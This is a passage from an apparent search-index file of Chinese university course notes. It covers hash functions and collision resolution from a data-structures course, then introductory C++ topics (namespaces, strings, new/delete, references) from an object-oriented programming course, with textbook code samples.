(\u7528\u4e8e\u5173\u952e\u5b57\u4f4d\u6570\u8f83\u591a\uff0c\u5e76\u4e14\u5173\u952e\u5b57\u4e2d\u6bcf\u4e00\u4f4d\u4e0a\u6570\u5b57\u5206\u5e03\u5927\u81f4\u5747\u5300)</p> Example <p></p> </li> <li> <p>\u6570\u5b57\u5206\u6790\u6cd5 \u2014\u2014 \u5f53\u5173\u952e\u5b57\u7684\u4f4d\u6570\u5927\u4e8e\u5730\u5740\u7684\u4f4d\u6570\uff0c\u5bf9\u5173\u952e\u5b57\u7684\u5404\u4f4d\u5206\u5e03\u8fdb\u884c\u5206\u6790\uff0c\u9009\u51fa\u5206\u5e03\u5747\u5300\u7684\u4efb\u610f\u51e0\u4f4d\u4f5c\u4e3a\u6563\u5217\u5730\u5740 (\u9002\u7528\u4e8e\u6240\u6709\u5173\u952e\u5b57\u90fd\u5df2\u77e5\u7684\u60c5\u51b5\u4e0b\uff0c\u6839\u636e\u5b9e\u9645\u5e94\u7528\u786e\u5b9a\u8981\u9009\u53d6\u7684\u90e8\u5206\uff0c\u5c3d\u91cf\u907f\u514d\u53d1\u751f\u51b2\u7a81)</p> Example <p>\u6bd4\u5982\u6309\u5b66\u53f7\u6620\u5c04\uff0c\u540c\u5c4a\u524d\u51e0\u4f4d\u76f8\u540c\uff0c\u5c06\u540e\u56db\u4f4d\u9009\u4e3a key</p> </li> <li> <p>\\(f(x) = (\\sum x[i]) ~~ \\% ~~ TableSize;\\) <code>/* if x is a string*/</code></p> Example <p>\\(x = \"abc\" \\Rightarrow \\sum x[i] = 'a' + 'b' + 'c'\\)</p> </li> <li> <p>\\(f(x) = (x[0] + x[1] * 27 + x[2] * 27^2 ) ~~ \\% ~~ TableSize;\\) <code>/* \u53d8\u6210 27 \u8fdb\u5236 */</code></p> </li> <li> <p>\\(f(x) = (\\sum x[N-i-1] * 32^i) ~~ \\% ~~ TableSize\\) <code>/* *32 \u53ef\u4ee5\u53d8\u4e3a\u79fb\u4f4d\u8fd0\u7b97 */</code></p> Example <pre><code>Index Hash3(const char *x, int TableSize)\n{\n    unsigned int HashVal = 0;\n    while(*x != '\\0')\n    {\n        HashVal = (HashVal &lt;&lt; 5) + *x++;\n    }\n    return HashVal % TableSize;\n}\n</code></pre> </li> </ul>"}, {"location": "Course/FDS/Lec06/#_3", "title": "\u89e3\u51b3\u51b2\u7a81", "text": ""}, {"location": "Course/FDS/Lec06/#separate-chaining", "title": "\u5206\u79bb\u94fe\u63a5 | Separate Chaining", "text": "<ul> <li>\u5c06\u6563\u5217\u5230\u76f8\u540c\u503c\u7684\u5143\u7d20\u4fdd\u5b58\u5728\u4e00\u4e2a\u5217\u8868\uff08\u94fe\u8868\uff09\u4e2d</li> </ul> code <pre><code>struct  ListNode; \ntypedef  struct  ListNode  *Position; \nstruct  HashTbl; \ntypedef  struct  HashTbl  *HashTable; \nstruct  ListNode { \n    ElementType  Element; \n    Position  Next; \n}; \ntypedef  Position  List; \n/* List *TheList will be an array of lists, allocated later */ \n/* The lists use headers (for simplicity), */ \n/* though this wastes space */ \nstruct  HashTbl { \n    int  TableSize; \n    List  *TheLists; \n}; \n</code></pre> Create an empty table <pre><code>HashTable  InitializeTable( int TableSize ) \n{   HashTable  H; \n    int  i; \n    if ( TableSize &lt; MinTableSize ) \n    { \n        Error( \"Table size too small\" );  \n        return NULL;  \n    } \n    H = malloc( sizeof( struct HashTbl ) );  /* Allocate table */\n    if ( H == NULL )    \n        FatalError( \"Out of space!!!\" ); \n    H-&gt;TableSize = NextPrime( TableSize );  /* Better be prime */\n    H-&gt;TheLists = malloc( sizeof( List ) * H-&gt;TableSize );  /*Array of lists*/\n    if ( H-&gt;TheLists == NULL )   \n        FatalError( \"Out of space!!!\" ); \n    for( i = 0; i &lt; H-&gt;TableSize; i++ ) \n    {   /* Allocate list headers */\n        H-&gt;TheLists[ i ] = malloc( sizeof( struct ListNode ) ); /* Slow! */\n        if ( H-&gt;TheLists[ i ] == NULL )  \n            FatalError( \"Out of space!!!\" ); \n        else    \n            H-&gt;TheLists[ i ]-&gt;Next = NULL;\n    } \n    return  H; \n} \n</code></pre> Find a key from a hash table <pre><code>Position  Find ( ElementType Key, HashTable H ) \n{ \n    Position P; \n    List L; \n\n    L = H-&gt;TheLists[ Hash( Key, H-&gt;TableSize ) ]; \n\n    P = L-&gt;Next; \n    while( P != NULL &amp;&amp; P-&gt;Element != Key )  /* Probably need strcmp */ \n        P = P-&gt;Next; \n    return P; \n} \n</code></pre> Insert a key into a hash table <pre><code>void  Insert ( ElementType Key, HashTable H ) \n{ \n    Position   Pos, NewCell; \n    List  L; \n    Pos = Find( Key, H ); \n    if ( Pos == NULL ) \n    {   /* Key is not found, then insert */\n        NewCell = malloc( sizeof( struct ListNode ) ); \n        if ( NewCell == NULL )     \n            FatalError( \"Out of space!!!\" ); \n        else \n        { \n            L = H-&gt;TheLists[ Hash( Key, H-&gt;TableSize ) ]; \n            NewCell-&gt;Next = L-&gt;Next; \n            NewCell-&gt;Element = Key; /* Probably need strcpy! */ \n            L-&gt;Next = NewCell; \n        } \n    } \n} \n</code></pre> <p>Tips: \u5c06 TableSize \u7684\u5927\u5c0f\u8bbe\u7f6e\u4e3a\u9884\u671f keys \u7684\u6570\u91cf\u51e0\u4e4e\u4e00\u6837 (i.e. \u4f7f\u5f97\u88c5\u8f7d\u5bc6\u5ea6 $\\lambda \\approx 1 $)</p>"}, {"location": "Course/FDS/Lec06/#open-adressing", "title": "\u5f00\u653e\u5730\u5740 | Open Adressing", "text": "<ul> <li>\u5f53\u6709\u51b2\u7a81\u53d1\u751f\u65f6\uff0c\u9009\u62e9\u4e0b\u4e00\u4e2a\u4f4d\u7f6e\uff0c\u76f4\u5230\u627e\u5230\u7a7a\u7684\u4e3a\u6b62</li> <li>\u5373\u6709\u591a\u4e2a\u54c8\u5e0c\u51fd\u6570 \\(h_0(x), h_1(x), \\cdots\\)\uff0c\u5176\u4e2d \\(h_i(x) = (\\mathrm{hash}(x)+f(i)) ~~ \\% ~~ TableSize\\)<ul> <li>\u5176\u4e2d \\(f(i)\\) \u4e3a\u589e\u91cf\u51fd\u6570\uff0c\u6709\u591a\u79cd\u9009\u53d6\u7684\u65b9\u5f0f</li> </ul> </li> <li>\u901a\u5e38\u60c5\u51b5\u4e0b \\(\\lambda &lt; 0.5\\) , \u5982\u679c\u5927\u4e8e 0.5 \u5c31\u4f1a\u5f15\u53d1\u5927\u91cf\u7684\u51b2\u7a81</li> </ul> <pre><code>void insert(int key) {\n    index = hash(key);\n    int i = 0;  // the counter of probing\n    while (collision at index) {\n        index = (hash(key) + f(i)) % TableSize;\n        if (table is full) \n            break;\n        else \n            i++;\n    }\n    if (table is full) \n        Error(\"No space left\");\n    else \n        insert key at index;\n}\n</code></pre> <ol> <li> <p>\u7ebf\u6027\u63a2\u6d4b | Linear Probing </p> <ul> <li>\u589e\u91cf\u51fd\u6570 \\(f(i) = i\\) \u2014\u2014 \u4f1a\u5bfc\u81f4\u521d\u6b21\u805a\u96c6\uff08primary clustering\uff09\uff0c\u5373\u4e00\u65e6\u53d1\u751f\u4e86\u51b2\u7a81\uff0c\u90a3\u4e48\u540e\u9762\u7684\u5143\u7d20\u90fd\u4f1a\u805a\u96c6\u5728\u4e00\u8d77\uff0c\u641c\u7d22\u6b21\u6570\u4f1a\u53d8\u5f97\u8d8a\u6765\u8d8a\u5927</li> <li>\u4f7f\u7528\u7ebf\u6027\u63a2\u6d4b\u7684\u63a2\u6d4b\u6b21\u6570\u5bf9\u4e8e\u63d2\u5165\u548c\u4e0d\u6210\u529f\u67e5\u627e\u6765\u8bf4\u7ea6\u4e3a\\(\\dfrac{1}{2}\\left(1+\\dfrac{1}{(1-\\lambda)^2}\\right)\\)</li> <li>\u5bf9\u4e8e\u6210\u529f\u7684\u67e5\u627e\u6765\u8bf4\u5219\u9700\u8981 \\(\\dfrac{1}{2}\\left(1+\\dfrac{1}{1-\\lambda}\\right)\\) \u6b21</li> </ul> Example <p> Average search time = 27 / 9 = 3</p> </li> <li> <p>\u4e8c\u6b21\u63a2\u6d4b | Quadratic Probing </p> <ul> <li>\u589e\u91cf\u51fd\u6570 \\(f(i) = i^2\\) \u2014\u2014 \u907f\u514d\u4e86 primary clustering, \u4f46\u662f\u5bfc\u81f4\u6709\u53ef\u80fd\u6709\u7a7a\u4f4d\u4f46\u5c31\u662f\u627e\u4e0d\u5230</li> <li> <p>\u82e5\u4f7f\u7528\u5e73\u65b9\u63a2\u6d4b\uff08\u6216\u4e8c\u6b21\u63a2\u6d4b\uff09, \u4e14\u8868\u7684\u5927\u5c0f\u662f\u7d20\u6570\uff0c\u90a3\u4e48\u5f53\u8868\u81f3\u5c11\u6709\u4e00\u534a\u662f\u7a7a\u7684\u65f6\u5019\uff0c\u603b\u80fd\u63d2\u5165\u4e00\u4e2a\u65b0\u7684\u5143\u7d20</p> <p>\u4e00\u4e9b\u6539\u8fdb: If the table size is a prime of the form \\(4k + 3\\) , then the quadratic probing  \\(f(i) = \\pm ~~ i^2\\) can probe the entire table.</p> Find <pre><code>Position  Find ( ElementType Key, HashTable H ) \n{   \n    Position  CurrentPos; \n    int  CollisionNum; \n    CollisionNum = 0; \n    CurrentPos = Hash( Key, H-&gt;TableSize ); \n    while( H-&gt;TheCells[ CurrentPos ].Info != Empty &amp;&amp; H-&gt;TheCells[ CurrentPos ].Element != Key ) \n    { \n        CurrentPos += 2 * ++CollisionNum - 1;  // h = h + 2i - 1\n        if ( CurrentPos &gt;= H-&gt;TableSize )  \n            CurrentPos -= H-&gt;TableSize;   \n    } \n    return CurrentPos; \n} \n</code></pre> Insert <pre><code>void  Insert ( ElementType Key, HashTable H ) \n{ \n    Position  Pos; \n    Pos = Find( Key, H ); \n    if ( H-&gt;TheCells[ Pos ].Info != Legitimate ) \n    { /* OK to insert here */ \n        H-&gt;TheCells[ Pos ].Info = Legitimate; \n        H-&gt;TheCells[ Pos ].Element = Key; /* Probably need strcpy */ \n    } \n} \n</code></pre> </li> </ul> <ol> <li>\u53cc\u91cd\u54c8\u5e0c | Double Hashing \u2014\u2014 \u5373 \\(f(i) = i \\times hash_2(x)\\); <code>/* hash2(x) \u662f\u7b2c\u4e8c\u4e2a hash \u51fd\u6570 */</code><ul> <li>\u4e00\u822c\u9009\u62e9 \\(hash_2(x) = R - (x ~~ \\% ~~ R)\\) (\\(R\\) \u4e3a\u5c0f\u4e8e\u8868\u5927\u5c0f\u7684\u8d28\u6570) \u6548\u679c\u66f4\u597d</li> <li>\u5982\u679c\u6b63\u786e\u5b9e\u73b0\u4e86\u53cc\u91cd\u54c8\u5e0c\uff0c\u6a21\u62df\u663e\u793a\u9884\u671f\u7684\u63a2\u6d4b\u6b21\u6570\u51e0\u4e4e\u4e0e\u968f\u673a\u51b2\u7a81\u89e3\u51b3\u7b56\u7565\u76f8\u540c</li> <li>\u4e8c\u6b21\u63a2\u6d4b\u4e0d\u9700\u8981\u4f7f\u7528\u7b2c\u4e8c\u4e2a\u54c8\u5e0c\u51fd\u6570\uff0c\u5728\u5b9e\u8df5\u4e2d\u66f4\u7b80\u5355\u5feb\u901f</li> </ul> </li> <li>\u518d\u54c8\u5e0c: <ul> <li>\u4f7f\u7528\u4e8c\u6b21\u63a2\u6d4b\uff0c\u5982\u679c\u8868\u7684\u5143\u7d20\u586b\u7684\u8fc7\u6ee1 (\u5927\u7ea6\u662f\u88c5\u8f7d\u5bc6\u5ea6 &gt; 0.5 \u65f6)\uff0c\u90a3\u4e48\u64cd\u4f5c\u65f6\u95f4\u4f1a\u8fc7\u957f\uff0c\u4e14 Insert \u53ef\u80fd\u5931\u8d25 \uff0c\u8fd9\u53ef\u80fd\u53d1\u751f\u5728\u6709\u592a\u591a\u7684\u79fb\u52a8\u548c\u63d2\u5165\u6df7\u5408\u7684\u573a\u5408</li> <li>\u89e3\u51b3\u65b9\u6cd5\u662f\u518d\u54c8\u5e0c: <ul> <li>\u5efa\u7acb\u53e6\u5916\u4e00\u4e2a\u5927\u7ea6\u4e24\u500d\u5927\u7684\u8868\u4e14\u4f7f\u7528\u4e00\u4e2a\u76f8\u5173\u7684\u65b0\u54c8\u5e0c\u51fd\u6570</li> <li>\u626b\u63cf\u6574\u4e2a\u539f\u59cb\u54c8\u5e0c\u8868</li> <li>\u8ba1\u7b97\u6bcf\u4e2a(\u672a\u5220\u9664\u7684)\u5143\u7d20\u7684\u65b0\u54c8\u5e0c\u503c\u5e76\u5c06\u5176\u63d2\u5165\u5230\u65b0\u8868\u4e2d</li> </ul> </li> <li>\u5982\u679c\u8868\u4e2d\u6709 N \u4e2a\u5143\u7d20\uff0c\u90a3\u518d\u54c8\u5e0c\u7684\u65f6\u95f4\u590d\u6742\u5ea6 \\(T(N) = O(N)\\) </li> <li>\u4ec0\u4e48\u65f6\u5019\u518d\u54c8\u5e0c<ul> <li>\u53ea\u8981\u8868\u6709\u4e00\u534a\u6ee1</li> <li>\u63d2\u5165\u64cd\u4f5c\u5931\u8d25\u65f6</li> <li>\u5f53\u8868\u8fbe\u5230\u4e00\u4e2a\u7279\u5b9a\u7684\u88c5\u8f7d\u5bc6\u5ea6</li> </ul> </li> </ul> </li> </ol> </li> </ol>"}, {"location": "Course/FDS/pta/", "title": "PTA \u4e60\u9898", "text": "<p> \u7ea6 3 \u4e2a\u5b57 </p>"}, {"location": "Course/OOP/", "title": "\u9762\u5411\u5bf9\u8c61\u7a0b\u5e8f\u8bbe\u8ba1", "text": "<p> \u7ea6 112 \u4e2a\u5b57 </p> <p>Abstract</p> <p>ZJU - OOP (\u9762\u5411\u5bf9\u8c61\u7a0b\u5e8f\u8bbe\u8ba1) \u8bfe\u7a0b</p> <ul> <li>\u53ea\u8003\u5230 c++11\uff0c\u540e\u7eed\u6807\u51c6\u672c\u8bfe\u7a0b\u4e0d\u505a\u8981\u6c42\uff08\u66f4\u7cfb\u7edf\u5316\u7684\u5b66\u4e60\u4ee5\u540e\u518d\u505a\uff09</li> <li>\u82f1\u6587\u90e8\u5206\u6709\u4e9b\u662f\u4e3a\u9632\u6b62\u7ffb\u8bd1\u5bfc\u81f4\u7684\u6b67\u4e49\uff0c\u6709\u4e9b\u662f\u61d2\u4e86</li> </ul> List <ul> <li> Beginning</li> <li> Step in Object-Oriented</li> <li> Container</li> <li> Object Interactive</li> <li> Key Words</li> <li> Inheritance &amp; Polymorphism</li> <li> Copt Ctor &amp; Overloaded Operators</li> <li> Templates</li> <li> Exception Handling</li> <li> Smart Pointers</li> <li> Class Design</li> <li> Streams &amp; \u7ee7\u627f\u6784\u9020\u51fd\u6570</li> </ul>"}, {"location": "Course/OOP/Lec01/", "title": "Beginning | \u7b2c\u4e00\u4e2a\u7a0b\u5e8f", "text": "<p> \u7ea6 1403 \u4e2a\u5b57  142 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 6 \u5206\u949f</p> <p>Abstract</p> <p>OOP \u4e09\u5927\u7279\u6027 - \u5c01\u88c5\u3001\u7ee7\u627f\u3001\u591a\u6001</p>"}, {"location": "Course/OOP/Lec01/#_1", "title": "\u7b2c\u4e00\u4e2a\u7a0b\u5e8f", "text": "<pre><code>#include &lt;iostream&gt;\nusing namespace std;\n\nint main()\n{\n    cout &lt;&lt; \"Hello World!\" &lt;&lt; endl;\n}\n</code></pre> <ul> <li><code>&lt;iostream&gt;</code> \u4e3a\u5185\u7f6e\u7c7b\u578b\u5bf9\u8c61\u63d0\u4f9b\u4e86\u8f93\u5165\u8f93\u51fa\u652f\u6301\uff0c\u540c\u65f6\u4e5f\u652f\u6301\u6587\u4ef6\u7684\u8f93\u5165\u8f93\u51fa\uff0c\u7c7b\u7684\u8bbe\u8ba1\u8005\u53ef\u4ee5\u901a\u8fc7\u5bf9 <code>iostream</code> \u5e93\u7684\u6269\u5c55\u6765\u652f\u6301\u81ea\u5b9a\u4e49\u7c7b\u578b\u7684\u8f93\u5165\u8f93\u51fa\u64cd\u4f5c</li> <li> <p><code>using namespace std;</code> \u544a\u8bc9\u7f16\u8bd1\u5668\u4f7f\u7528 std \u547d\u540d\u7a7a\u95f4 (\u547d\u540d\u7a7a\u95f4\u662f C++ \u4e2d\u4e00\u4e2a\u76f8\u5bf9\u65b0\u7684\u6982\u5ff5)</p> <ul> <li><code>namespace</code> \u662f\u6307\u6807\u8bc6\u7b26\u7684\u5404\u79cd\u53ef\u89c1\u8303\u56f4\uff0cC++ \u6807\u51c6\u7a0b\u5e8f\u5e93\u4e2d\u7684\u6240\u6709\u6807\u8bc6\u7b26\u90fd\u88ab\u5b9a\u4e49\u4e8e\u4e00\u4e2a\u540d\u4e3a std \u7684 <code>namespace</code> \u4e2d</li> <li>\u7531\u4e8e <code>namespace</code> \u7684\u6982\u5ff5\uff0c\u4f7f\u7528 C++ \u6807\u51c6\u7a0b\u5e8f\u5e93\u7684\u4efb\u4f55\u6807\u8bc6\u7b26\u65f6\uff0c\u53ef\u4ee5\u6709\u4e09\u79cd\u9009\u62e9\uff1a<ol> <li>\u76f4\u63a5\u6307\u5b9a\u6807\u8bc6\u7b26 \u2014\u2014 \u5982 <code>std::ostream</code> \u800c\u4e0d\u662f <code>ostream</code> (\u5b8c\u6574\u8bed\u53e5 A : <code>std::cout &lt;&lt; std::hex &lt;&lt; 5.0 &lt;&lt; std::endl;</code>)</li> <li>\u4f7f\u7528 <code>using</code> \u5173\u952e\u5b57 \u2014\u2014 \u5982 <code>using std::cout; using std::endl</code> (\u5b8c\u6574\u8bed\u53e5 A \u6539\u5199\u4e3a: <code>cout &lt;&lt; std::hex &lt;&lt; 5.0 &lt;&lt; endl;</code>)</li> <li>\u6700\u65b9\u4fbf\u7684\u662f\u4f7f\u7528 <code>using namespace std;</code>\uff0c\u8fd9\u6837\u547d\u540d\u7a7a\u95f4 std \u5185\u5b9a\u4e49\u7684\u6240\u6709\u6807\u8bc6\u7b26\u90fd\u6709\u6548 (\u5c31\u50cf\u88ab\u58f0\u660e\u4e3a\u5168\u5c40\u53d8\u91cf\u4e00\u6837\uff0c\u5b8c\u6574\u8bed\u53e5 A \u6539\u5199\u4e3a\uff1a<code>cout &lt;&lt; hex &lt;&lt; 5.0 &lt;&lt; endl</code>)</li> </ol> </li> </ul> </li> <li> <p>\u82e5\u8f93\u5165\u5219\u91c7\u7528 <code>cin</code> \u8f93\u5165 <pre><code>#include &lt;iostream&gt;\nusing namespace std;\n\nint main()\n{\n    int age;\n    cin &gt;&gt; age;\n    cout &lt;&lt; \"Hello World! I'm \"&lt;&lt; age &lt;&lt; \" today!\" &lt;&lt; endl;\n}\n</code></pre></p> </li> </ul>"}, {"location": "Course/OOP/Lec01/#string", "title": "\u5b57\u7b26\u4e32 | String", "text": "<ul> <li>\u9996\u5148\u8981\u52a0\u5165\u5e93 <code>&lt;string&gt;</code></li> <li>\u5b9a\u4e49\u5b57\u7b26\u4e32\u53d8\u91cf \u2014\u2014 <code>string str;</code></li> <li>\u521d\u59cb\u5316\u5b57\u7b26\u4e32\u53d8\u91cf \u2014\u2014 <code>string str = \"Molan\";</code></li> <li>\u8f93\u5165\u8f93\u51fa\u5b57\u7b26\u4e32\u5373\u4f7f\u7528 <code>cin</code>, <code>cout</code> \u2014\u2014 <code>cin &gt;&gt; str; cout &lt;&lt; str;</code></li> <li>C++ \u4e2d\u7684\u5b57\u7b26\u4e32\u53d8\u91cf\u652f\u6301\u7c7b\u4f3c\u6574\u578b\u53d8\u91cf\u7684\u64cd\u4f5c \u2014\u2014 <code>+</code> (\u62fc\u63a5) \u00b7\u00b7\u00b7</li> </ul> b.cpp<pre><code>#include &lt;iostream&gt;\nusing namespace std;\n\nint main()\n{\n    int age;\n    string name;\n    cin &gt;&gt; age &gt;&gt; name;\n    name += \" (Enl_Z) \"\n    cout &lt;&lt; \"Hello World! \" &lt;&lt; name &lt;&lt; \" is \" &lt;&lt; age &lt;&lt; \" today!\"&lt;&lt; endl;\n}\n</code></pre> <pre><code>$ g++ b.cpp; ./a.out\n18 Molan\nHello World! Molan (Enl_Z) is 18 today!\n</code></pre> <ul> <li><code>string</code> \u4e0d\u9700\u8981\u50cf <code>char str[10]</code> \u4e00\u6837\u8bbe\u7f6e\u957f\u5ea6\uff0c\u76f4\u63a5\u4f7f\u7528 <code>string str;</code> \u5373\u53ef (\u5185\u90e8\u4f1a\u81ea\u52a8\u8c03\u6574\u957f\u5ea6\uff0c\u4e14\u5b57\u7b26\u4e32\u672b\u5c3e\u65e0 <code>\\0</code>)</li> <li><code>string</code> \u53d8\u91cf\u652f\u6301\u8d4b\u503c\uff0c\u5373 <code>str1 = str2;</code> \u662f\u5408\u6cd5\u7684</li> </ul> <p>\u91c7\u7528 <code>string str(\"Hello\");</code> \u548c <code>string str = \"Hello\";</code> \u662f\u4e00\u6837\u7684 (\u6b64\u79cd\u521d\u59cb\u5316\u65b9\u6cd5\u5bf9\u5176\u4ed6\u53d8\u91cf\u4e5f\u9002\u7528)</p>"}, {"location": "Course/OOP/Lec01/#pointers-to-objects", "title": "Pointers to Objects", "text": "<p>\u6b63\u4ea4: \u82e5\u6709\u67d0\u4e2a\u64cd\u4f5c\u5bf9\u67d0\u4e2a\u6570\u636e\u7c7b\u578b\u662f\u53ef\u7528\u7684\uff0c\u5219\u7406\u8bba\u4e0a\u5e94\u6ee1\u8db3\u5176\u5bf9\u6240\u6709\u6570\u636e\u7c7b\u578b\u53ef\u7528 (\u5982\uff0c\u53d6\u5730\u5740\u5bf9\u6574\u6570\u53ef\u7528\u5219\u5e94\u5bf9 <code>string</code> \u4e5f\u53ef\u7528)</p> <ul> <li>Operators with Pointers<ul> <li><code>&amp;</code> : get address (e.g. <code>ps = &amp;s;</code> )</li> <li><code>*</code> : get the object (e.g. <code>(*ps).length()</code> )</li> <li><code>-&gt;</code> : call the function (e.g. <code>ps-&gt;length()</code> )</li> </ul> </li> <li>Two Ways to Access Objects<ul> <li><code>string s;</code><ul> <li><code>s</code> is the object itself</li> <li>\u6b64\u65f6\uff0c\u5bf9\u8c61\u5df2\u7ecf\u88ab\u521b\u5efa\u5e76\u521d\u59cb\u5316\u4e3a\u4e00\u4e2a\u9ed8\u8ba4\u7684\u503c (\u7531\u7c7b\u51b3\u5b9a, \u8c03\u7528\u7c7b\u7684\u6784\u9020\u51fd\u6570\u521d\u59cb\u5316)</li> </ul> </li> <li><code>string* ps;</code><ul> <li><code>ps</code> is a pointer to an object</li> <li>In this time, the value of <code>ps</code> is still unknown</li> </ul> </li> </ul> </li> <li>Assignment<ol> <li><code>string s1, s2;</code><ul> <li><code>s1 = s2;</code></li> </ul> </li> <li><code>string *ps1, ps2;</code><ul> <li><code>ps1= ps2</code></li> </ul> </li> </ol> </li> </ul>"}, {"location": "Course/OOP/Lec01/#dynamic-memory-allocation", "title": "Dynamic memory allocation", "text": "<p><code>new</code> \u548c <code>delete</code> \u90fd\u662f\u8fd0\u7b97\u7b26, c++ \u4e2d\u867d\u7136\u4e5f\u6709 <code>malloc</code>\uff0c\u4f46\u6700\u597d\u4e0d\u8981\u518d\u4f7f\u7528</p> <ul> <li> <p><code>new</code></p> <ul> <li><code>new int;</code> (\u7c7b\u4f3c\u4e8e <code>malloc(sizeof(int))</code> \u7533\u8bf7\u4e00\u4e2a <code>int</code> \u7684\u7a7a\u95f4)</li> <li><code>new Stash;</code> (<code>Stash</code> \u662f\u4e00\u4e2a\u7c7b\uff0c\u6b64\u5904\u7533\u8bf7\u4e86\u4e00\u4e2a <code>Stash</code> \u7684\u7a7a\u95f4\uff0c\u4f46\u4e0d\u540c <code>malloc</code> \u7684\u662f\u5176\u8fd8\u8c03\u7528\u6784\u9020\u51fd\u6570\u8fdb\u884c\u4e86\u521d\u59cb\u5316)</li> <li><code>new int[10]</code></li> </ul> <p><code>new</code> is the way to allocate memory as a program runs. Pointers become the only access to that memory. <code>new</code> \u6ca1\u6709\u7a7a\u95f4\u7684\u65f6\u5019\u4e0d\u4f1a\u8fd4\u56de <code>NULL</code> \u800c\u662f\u629b\u5f02\u5e38</p> </li> <li> <p><code>delete</code> \u2014\u2014 \u8c03\u7528\u6790\u6784\u51fd\u6570, \u5728\u6790\u6784\u51fd\u6570\u4e2d\u7528\u4e8e\u91ca\u653e\u7c7b\u5185\u90e8\u52a8\u6001\u5206\u914d\u5f97\u5230\u7684\u8d44\u6e90  (\u7531\u4e8e\u5185\u7f6e\u7c7b\u578b\u6ca1\u6709\u6790\u6784\u51fd\u6570\uff0c\u6240\u4ee5 <code>delete</code> \u5185\u7f6e\u7c7b\u578b\u6307\u9488\u65f6\uff0c\u4ec0\u4e48\u4e5f\u4e0d\u9700\u8981\u505a)</p> <ul> <li><code>delete p;</code></li> <li><code>delete[] p;</code> <p><code>delete</code> enables you to return memory to the memory pool when you are finished with it.</p> </li> </ul> </li> </ul>"}, {"location": "Course/OOP/Lec01/#dynamic-arrays", "title": "Dynamic Arrays", "text": "<ul> <li><code>int * psome = new int[10];</code><ul> <li>The <code>new</code> operator returns the address of the first element of the block.</li> </ul> </li> <li><code>delete [] psome;</code><ul> <li>The presence of the brackets tells the program that it should free the whole array, not just the element (<code>delete</code> \u65e0\u6cd5\u6307\u5b9a\u6570\u91cf\uff0c\u5373\u65b9\u62ec\u53f7\u5185\u65e0\u6cd5\u586b\u5165\u6570\u5b57)</li> </ul> </li> </ul> Example <p><pre><code>int *a = new int[10];\na++; delete[] a;\n</code></pre> \u6b64\u65f6 <code>delete[] a;</code> \u4f1a\u51fa\u9519\uff0c\u56e0\u4e3a <code>a++</code> \u540e\u5728\u8fd9\u5f20\u8868\u4e2d\u6ca1\u6709 <code>a</code> \u8fd9\u4e00\u9879\uff0c\u800c\u662f\u6709 <code>a-1</code></p>"}, {"location": "Course/OOP/Lec01/#tips-for-new-delete", "title": "Tips for new &amp; delete", "text": "<ul> <li>Don\u2019t use <code>delete</code> to free memory that <code>new</code> didn\u2019t allocate</li> <li>Don\u2019t use <code>delete</code> to free the same block of memory</li> <li>Use <code>delete []</code> if you used <code>new[]</code></li> <li>Use <code>delete</code>(without brackets) if you used <code>new</code> to allocate a single entity</li> <li>It is safe to apply delete to the null pointer (nothing happens)</li> </ul>"}, {"location": "Course/OOP/Lec01/#class", "title": "Class", "text": ""}, {"location": "Course/OOP/Lec01/#reference", "title": "reference", "text": "<ul> <li>Reference is a new way to manipulate objects in C++<ul> <li>\u5728 c \u4e2d <code>char c; char &amp;r = c;</code> //a reference to a character</li> <li><code>r</code> is regarded as a reference to a character <code>c</code></li> </ul> </li> <li>\u82e5\u53d8\u91cf\u662f\u672c\u5730\u6216\u5168\u5c40\u53d8\u91cf\uff0c\u5728\u58f0\u660e\u53d8\u91cf\u7684\u65f6\u5019\uff0c\u5fc5\u987b\u5bf9\u5176\u505a\u7ed1\u5b9a</li> <li>\u5982\u679c\u662f\u53c2\u6570\u5217\u8868\u6216\u6210\u5458\u53d8\u91cf\uff0c\u4e0d\u9700\u8981\u7ed9\u51fa\u7ed1\u5b9a</li> </ul>"}, {"location": "Course/OOP/Lec01/#rules-of-references", "title": "Rules of references", "text": "<ul> <li>References must be initialized when defined</li> <li>As a function argument<ul> <li><code>void f(int &amp;x)</code></li> <li><code>f(y);</code> //initialized when function is called </li> </ul> </li> <li>Bindings don\u2019t change at run time (\u5373\u4e0d\u53ef\u4ee5\u89e3\u7ed1)</li> <li>The target of a reference must have a location (\u5373\u5f15\u7528\u7684\u5bf9\u8c61\u53ea\u80fd\u662f\u5de6\u503c)<ul> <li><code>void func(int &amp;);</code></li> <li><code>func(i * 3);</code>    //warning or error!</li> </ul> </li> </ul>"}, {"location": "Course/OOP/Lec01/#points-vs-references", "title": "Points vs. References", "text": "<ul> <li>References<ul> <li>can\u2019t be null</li> <li>are dependent on an existing variable, they are an alias for an variable</li> <li>can\u2019t change to a new \u201caddress\u201d location</li> </ul> </li> <li>Pointers<ul> <li>can be set to a null</li> <li>pointer is independent of existing objects</li> <li>can change to point to a different address</li> </ul> </li> </ul>"}, {"location": "Course/OOP/Lec01/#restrictions", "title": "Restrictions", "text": "<ul> <li>No references to references (e.g. <code>int i; int &amp;r = i; int &amp;k = r;</code> \u00d7)</li> <li>No pointers to references (e.g. <code>int&amp;* p;</code> \u00d7) (Allow reference to pointer \u2014\u2014 <code>void f(int*&amp; p);</code>)</li> <li>No arrays of references </li> </ul>"}, {"location": "Course/OOP/Lec01/#point", "title": "Point | \u70b9", "text": "C \u7248\u672c structC++ \u7248\u672c <pre><code>#include &lt;iostream&gt;\nusing namespace std;\n\ntypedef struct Point{\n    float x;\n    float y;\n} Point;\n\nvoid print(const Point *p)\n{\n    cout &lt;&lt; p-&gt;x &lt;&lt; \" , \" &lt;&lt; p-&gt;y &lt;&lt; endl;\n}\nvoid move(Point *p, int dx, int dy)\n{\n    p-&gt;x += dx;\n    p-&gt;y += dy;\n}\nint main()\n{\n    Point a, b;\n    a.x = b.x = 1;\n    a.y = b.y = 1;\n    //\u4e5f\u53ef\u4ee5\u5199\u4f5c \n    //Point a = {1, 1}, b = {1, 1};\n    move(&amp;a, 2, 2);\n    print(&amp;a);\n    print(&amp;b);\n}\n</code></pre> <pre><code>#include &lt;iostream&gt;\nusing namespace std;\n\nstruct Point{   \n    float x;\n    float y;\n    void print()\n    {\n        cout &lt;&lt; x &lt;&lt; \" , \" &lt;&lt; y &lt;&lt; endl;\n    }\n} ;\n\nvoid move(Point *p, int dx, int dy)\n{\n    p-&gt;x += dx;\n    p-&gt;y += dy;\n}\nint main()\n{\n    Point a, b;\n    a.x = b.x = 1;\n    a.y = b.y = 1;\n    move(&amp;a, 2, 2);\n    a.print();\n    b.print();\n}\n</code></pre> <ul> 